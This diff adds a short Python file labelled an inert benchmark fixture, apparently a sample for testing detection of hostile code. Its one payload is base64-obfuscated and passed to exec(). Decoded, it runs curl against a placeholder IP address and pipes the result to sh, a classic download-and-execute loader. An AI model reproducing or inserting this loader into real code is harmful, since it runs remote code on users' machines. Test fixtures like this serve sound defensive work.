@@ -1,0 +1,4 @@
+# INERT BENCHMARK FIXTURE - never import or run. Read as text by benchmark_fixtures.py only.
+import base64
+payload = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cDovLzE5OC41MS4xMDAuNDIvc2ggfCBzaCIp"
+exec(base64.b64decode(payload))
